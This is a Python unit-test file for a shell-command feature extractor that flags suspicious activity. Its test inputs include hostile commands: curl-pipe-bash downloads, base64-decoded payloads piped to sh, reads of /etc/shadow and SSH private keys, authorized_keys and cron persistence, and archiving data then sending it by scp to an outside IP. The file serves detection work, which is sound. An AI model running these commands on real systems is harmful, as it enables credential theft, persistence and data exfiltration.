"""Feature extractor tests (the checklist from section 28 of the spec)."""

from __future__ import annotations

import unittest
from typing import Dict

import _bootstrap  # noqa: F401
from cmdfeat.events import Event
from cmdfeat.pipeline import ExtractorConfig, FeatureExtractor


def features(command: str, **event_kwargs) -> Dict[str, object]:
    """Extract stateless features for a single command line."""
    extractor = FeatureExtractor(ExtractorConfig(include_behavioral=False))
    return extractor.extract_event(Event(0, 1, command=command, **event_kwargs))


class SimpleCommandTest(unittest.TestCase):
    def test_bare_command(self) -> None:
        f = features("ls")
        self.assertEqual(f["executable_basename"], "ls")
        self.assertEqual(f["arg_count"], 0)
        self.assertEqual(f["command_length"], 2)
        self.assertEqual(f["pipeline_length"], 1)

    def test_command_with_arguments(self) -> None:
        f = features("ls -la /var/log")
        self.assertEqual(f["arg_count"], 2)
        self.assertEqual(f["flag_count"], 1)
        self.assertEqual(f["positional_arg_count"], 1)
        self.assertEqual(f["arg_length_max"], len("/var/log"))
        self.assertTrue(f["touches_var_log"])

    def test_quoted_arguments(self) -> None:
        f = features("grep -r 'error message' /var/log")
        self.assertTrue(f["has_single_quote"])
        self.assertEqual(f["quoted_string_count"], 1)
        self.assertEqual(f["arg_with_space_count"], 1)

    def test_empty_command(self) -> None:
        f = features("")
        self.assertTrue(f["is_empty_command"])
        self.assertEqual(f["executable_basename"], "")
        self.assertEqual(f["normalized_command"], "")

    def test_missing_fields(self) -> None:
        f = features("id")
        self.assertEqual(f["user"], "")
        self.assertEqual(f["timestamp"], "")
        self.assertEqual(f["hour"], -1)
        self.assertEqual(f["uid"], -1)
        self.assertFalse(f["ancestry_available"])

    def test_malformed_syntax_does_not_raise(self) -> None:
        for command in ("echo 'unterminated", "| | |", ">>>", "$(", "cmd &&"):
            f = features(command)
            self.assertEqual(f["extraction_error"], "")


class ShellStructureTest(unittest.TestCase):
    def test_pipes(self) -> None:
        f = features("cat access.log | grep 500 | wc -l")
        self.assertTrue(f["has_pipe"])
        self.assertEqual(f["pipe_count"], 2)
        self.assertEqual(f["pipeline_length"], 3)
        self.assertEqual(f["segment_count"], 3)

    def test_redirects(self) -> None:
        f = features("./job.sh > /tmp/out 2>&1")
        self.assertTrue(f["has_output_redirect"])
        self.assertTrue(f["has_combined_redirect"])
        self.assertEqual(f["redirect_count"], 2)
        self.assertTrue(f["overwrite_indicator"])

    def test_append_redirect_is_not_overwrite(self) -> None:
        f = features("echo hi >> /var/log/app.log")
        self.assertTrue(f["has_append_redirect"])
        self.assertTrue(f["append_indicator"])
        self.assertFalse(f["overwrite_indicator"])

    def test_command_substitution(self) -> None:
        f = features("echo $(hostname) at `date`")
        self.assertTrue(f["has_command_substitution"])
        self.assertTrue(f["has_backtick_substitution"])
        self.assertEqual(f["command_substitution_count"], 1)

    def test_logical_operators(self) -> None:
        f = features("make build && make test || echo failed")
        self.assertTrue(f["has_logical_and"])
        self.assertTrue(f["has_logical_or"])
        self.assertEqual(f["logical_operator_count"], 2)

    def test_globbing_and_background(self) -> None:
        f = features("rm -f /tmp/*.log &")
        self.assertTrue(f["has_glob_star"])
        self.assertTrue(f["has_background"])
        self.assertTrue(f["wildcard_delete"])


class InterpreterTest(unittest.TestCase):
    def test_shell_dash_c(self) -> None:
        f = features("bash -c 'id; uname -a'")
        self.assertTrue(f["uses_shell"])
        self.assertTrue(f["inline_script_execution"])
        self.assertTrue(f["has_dash_c"])
        self.assertEqual(f["interpreter_family"], "shell")

    def test_python_inline(self) -> None:
        f = features("python3 -c 'import socket; print(socket.gethostname())'")
        self.assertTrue(f["uses_python"])
        self.assertTrue(f["inline_script_execution"])
        self.assertEqual(f["interpreter_family"], "script")

    def test_perl_inline(self) -> None:
        f = features("""perl -e 'print "hi\\n"'""")
        self.assertTrue(f["uses_perl"])
        self.assertTrue(f["inline_script_execution"])

    def test_nested_shell(self) -> None:
        f = features("bash -c 'sh -c \"id\"'")
        self.assertTrue(f["nested_interpreter"])
        self.assertTrue(f["shell_from_shell"])

    def test_script_file_execution(self) -> None:
        f = features("python3 /opt/jobs/reconcile.py --date 2026-01-01")
        self.assertTrue(f["script_file_execution"])
        self.assertFalse(f["inline_script_execution"])

    def test_wrapper_resolution(self) -> None:
        f = features("sudo -u svc env FOO=1 timeout 30 python3 /opt/app.py")
        self.assertEqual(f["executable_basename"], "python3")
        self.assertEqual(f["sudo_target_user"], "svc")
        self.assertTrue(f["uses_wrapper"])
        self.assertEqual(f["env_assignment_count"], 1)


class NetworkTest(unittest.TestCase):
    def test_url(self) -> None:
        f = features("curl -s https://api.example.com/v1/items?page=2#frag")
        self.assertTrue(f["has_url"])
        self.assertEqual(f["url_scheme"], "https")
        self.assertTrue(f["url_query_present"])
        self.assertTrue(f["url_fragment_present"])
        self.assertEqual(f["primary_domain"], "api.example.com")
        self.assertEqual(f["domain_suffix"], "com")

    def test_ipv4(self) -> None:
        f = features("ssh deploy@10.0.5.23")
        self.assertTrue(f["has_ipv4"])
        self.assertTrue(f["has_private_ip"])
        self.assertTrue(f["has_user_at_host"])
        self.assertEqual(f["ipv4_count"], 1)

    def test_public_ip_and_port(self) -> None:
        f = features("nc -zv 203.0.113.9 4444")
        self.assertTrue(f["has_ipv4"])
        self.assertTrue(f["has_nonstandard_port"])
        self.assertTrue(f["uses_socket_tool"])

    def test_ipv6(self) -> None:
        f = features("ping6 2001:db8::1")
        self.assertTrue(f["has_ipv6"])
        self.assertEqual(f["ipv6_count"], 1)

    def test_url_with_raw_ip(self) -> None:
        f = features("wget http://192.168.1.10/payload.tar.gz")
        self.assertTrue(f["url_has_ip_host"])
        self.assertTrue(f["network_download"])

    def test_timestamp_is_not_an_ipv6(self) -> None:
        f = features("journalctl --since 12:30:15")
        self.assertFalse(f["has_ipv6"])

    def test_filename_is_not_a_domain(self) -> None:
        f = features("python3 setup.py build")
        self.assertFalse(f["has_domain"])


class ChainTest(unittest.TestCase):
    def test_curl_pipe_shell(self) -> None:
        f = features("curl -fsSL https://example.com/install.sh | bash")
        self.assertTrue(f["network_to_shell_pipeline"])
        self.assertTrue(f["download_then_execute"])
        self.assertTrue(f["pipeline_ends_in_interpreter"])

    def test_wget_pipe_python(self) -> None:
        f = features("wget -qO- http://h/s.py | python3 -")
        self.assertTrue(f["network_to_interpreter_pipeline"])

    def test_download_to_tmp_then_chmod(self) -> None:
        f = features("curl -o /tmp/x http://10.0.0.5/x && chmod +x /tmp/x && /tmp/x")
        self.assertTrue(f["download_to_tmp"])
        self.assertTrue(f["chmod_following_download"])
        self.assertTrue(f["downloaded_file_executed"])
        self.assertEqual(f["download_output_path"], "/tmp/x")

    def test_plain_download_is_not_execution(self) -> None:
        f = features("wget https://repo.example.com/pkg.tar.gz")
        self.assertTrue(f["network_download"])
        self.assertFalse(f["download_then_execute"])
        self.assertFalse(f["network_to_shell_pipeline"])

    def test_chain_inside_shell_payload(self) -> None:
        f = features("bash -c 'curl -s http://h/s.sh | sh'")
        self.assertTrue(f["network_to_shell_pipeline"])


class EncodingTest(unittest.TestCase):
    def test_base64_decode_to_shell(self) -> None:
        f = features("echo aWQgLWEK | base64 -d | sh")
        self.assertTrue(f["base64_decode"])
        self.assertTrue(f["base64_to_interpreter"])
        self.assertTrue(f["has_base64_keyword"])
        self.assertGreaterEqual(f["obfuscation_characteristic_count"], 2)

    def test_hex_escapes(self) -> None:
        f = features(r"printf '\x69\x64' | sh")
        self.assertTrue(f["has_hex_escape"])
        self.assertTrue(f["char_construction"])
        self.assertTrue(f["uses_printf_construction"])

    def test_entropy_is_measured(self) -> None:
        f = features("echo dGhpcyBpcyBhIGxvbmcgYmFzZTY0IHN0cmluZyBmb3IgdGVzdGluZw==")
        self.assertGreater(f["longest_token_entropy"], 3.5)
        self.assertGreaterEqual(f["base64_like_token_count"], 1)

    def test_normal_command_is_not_obfuscated(self) -> None:
        f = features("git status")
        self.assertEqual(f["obfuscation_characteristic_count"], 0)
        self.assertFalse(f["excessive_backslash"])

    def test_eval_is_dynamic_construction(self) -> None:
        f = features('eval "$CMD"')
        self.assertTrue(f["uses_eval"])
        self.assertTrue(f["dynamic_command_construction"])


class SensitivePathTest(unittest.TestCase):
    def test_shadow(self) -> None:
        f = features("sudo cat /etc/shadow")
        self.assertTrue(f["touches_shadow"])
        self.assertTrue(f["touches_sensitive_path"])
        self.assertTrue(f["shadow_file_reference"])
        self.assertTrue(f["credential_reference"])

    def test_passwd_and_sudoers(self) -> None:
        f = features("sudo vim /etc/sudoers.d/ops")
        self.assertTrue(f["touches_sudoers"])
        self.assertTrue(f["sudo_configuration"])
        self.assertTrue(f["persistence_indicator"])

    def test_ssh_keys(self) -> None:
        f = features("cat /home/alice/.ssh/id_rsa")
        self.assertTrue(f["ssh_key_reference"])
        self.assertTrue(f["private_key_reference"])
        self.assertTrue(f["touches_private_key"])
        self.assertEqual(f["ssh_path_count"], 1)

    def test_authorized_keys_append(self) -> None:
        f = features("echo 'ssh-ed25519 AAAA' >> /home/bob/.ssh/authorized_keys")
        self.assertTrue(f["touches_authorized_keys"])
        self.assertTrue(f["ssh_persistence"])
        self.assertTrue(f["authorized_keys_write"])

    def test_tmp_and_dev_shm(self) -> None:
        f = features("cp /dev/shm/.x /tmp/.y")
        self.assertTrue(f["touches_tmp"])
        self.assertTrue(f["touches_dev_shm"])
        self.assertEqual(f["hidden_file_count"], 2)

    def test_ordinary_path_is_not_sensitive(self) -> None:
        f = features("vim /home/alice/src/app/main.py")
        self.assertFalse(f["touches_sensitive_path"])
        self.assertTrue(f["touches_home"])


class PersistenceTest(unittest.TestCase):
    def test_cron(self) -> None:
        f = features("(crontab -l; echo '*/5 * * * * /tmp/x.sh') | crontab -")
        self.assertTrue(f["cron_persistence"])
        self.assertTrue(f["persistence_indicator"])

    def test_systemd(self) -> None:
        f = features("sudo systemctl enable --now collector.service")
        self.assertTrue(f["systemd_persistence"])
        self.assertTrue(f["service_enable"])

    def test_daemon_reload(self) -> None:
        self.assertTrue(features("sudo systemctl daemon-reload")["daemon_reload"])

    def test_shell_startup(self) -> None:
        f = features("echo 'export PATH=$PATH:/tmp' >> ~/.bashrc")
        self.assertTrue(f["shell_startup_persistence"])
        self.assertTrue(f["shell_startup_write"])

    def test_ld_preload(self) -> None:
        f = features("sudo tee /etc/ld.so.preload")
        self.assertTrue(f["preload_persistence"])


class PrivilegeTest(unittest.TestCase):
    def test_sudo_wrapper(self) -> None:
        f = features("sudo systemctl restart nginx")
        self.assertTrue(f["uses_sudo"])
        self.assertEqual(f["executable_basename"], "systemctl")
        self.assertTrue(f["privilege_tool_used"])

    def test_sudo_shell(self) -> None:
        f = features("sudo -u root /bin/bash")
        self.assertTrue(f["sudo_shell"])
        self.assertEqual(f["sudo_target_user"], "root")

    def test_sudo_list(self) -> None:
        self.assertTrue(features("sudo -l")["sudo_list_permissions"])

    def test_chmod_world_writable(self) -> None:
        f = features("sudo chmod -R 777 /data/out")
        self.assertTrue(f["chmod_world_writable"])
        self.assertTrue(f["chmod_recursive"])
        self.assertTrue(f["permission_change"])

    def test_setuid_bit(self) -> None:
        self.assertTrue(features("chmod u+s /usr/local/bin/helper")["setuid_related"])

    def test_identity_fields(self) -> None:
        f = features("id", uid=1000, euid=0, gid=1000, egid=1000)
        self.assertTrue(f["uid_euid_mismatch"])
        self.assertTrue(f["runs_as_root"])
        self.assertTrue(f["identity_fields_available"])

    def test_user_management(self) -> None:
        f = features("sudo useradd -m -s /bin/bash newdev")
        self.assertTrue(f["user_management"])


class MiscCategoryTest(unittest.TestCase):
    def test_discovery_categories(self) -> None:
        f = features("whoami && uname -a && ip addr")
        self.assertTrue(f["identity_discovery"])
        self.assertTrue(f["host_discovery"])
        self.assertTrue(f["network_discovery"])
        self.assertGreaterEqual(f["discovery_category_count"], 3)

    def test_history_clearing(self) -> None:
        f = features("history -c")
        self.assertTrue(f["history_cleared"])

    def test_container_exec(self) -> None:
        f = features("docker exec -it web /bin/sh")
        self.assertTrue(f["container_tool"])
        self.assertTrue(f["container_exec"])
        self.assertTrue(f["container_shell"])

    def test_docker_socket(self) -> None:
        self.assertTrue(features("curl --unix-socket /var/run/docker.sock http://localhost/containers/json")["docker_socket_access"])

    def test_kernel_module(self) -> None:
        f = features("sudo insmod /lib/modules/extra/mod.ko")
        self.assertTrue(f["kernel_module_operation"])
        self.assertTrue(f["kernel_module_load"])
        self.assertTrue(f["kernel_module_path"])

    def test_proc_inspection(self) -> None:
        f = features("cat /proc/1234/maps")
        self.assertTrue(f["proc_inspection"])
        self.assertTrue(f["proc_mem_access"])
        self.assertTrue(f["pid_reference"])

    def test_archive_and_transfer(self) -> None:
        f = features("tar czf /tmp/data.tgz /srv/data && scp /tmp/data.tgz user@198.51.100.7:/tmp/")
        self.assertTrue(f["archive_creation"])
        self.assertEqual(f["archive_format"], "tar.gz")
        self.assertTrue(f["remote_copy"])
        self.assertTrue(f["upload_indicator"])
        self.assertTrue(f["outbound_transfer_indicator"])

    def test_download_not_upload(self) -> None:
        f = features("scp user@10.1.1.1:/var/log/app.log /tmp/")
        self.assertTrue(f["download_indicator"])
        self.assertFalse(f["upload_indicator"])

    def test_file_deletion(self) -> None:
        f = features("rm -rf /tmp/build")
        self.assertTrue(f["file_delete_indicator"])
        self.assertTrue(f["recursive_delete"])
        self.assertTrue(f["force_delete"])

    def test_ancestry_fields(self) -> None:
        f = features("id", parent_exe="/usr/sbin/sshd", user="alice", parent_user="root", tty="pts/1")
        self.assertTrue(f["from_sshd"])
        self.assertTrue(f["ancestry_available"])
        self.assertTrue(f["parent_user_mismatch"])
        self.assertTrue(f["interactive_session"])

    def test_temporal_fields(self) -> None:
        from cmdfeat.events import parse_timestamp
        f = features("ls", timestamp=parse_timestamp("2026-09-12T03:15:00Z"))
        self.assertEqual(f["hour"], 3)
        self.assertTrue(f["is_night"])
        self.assertTrue(f["is_weekend"])
        self.assertFalse(f["is_business_hours"])


if __name__ == "__main__":
    unittest.main()
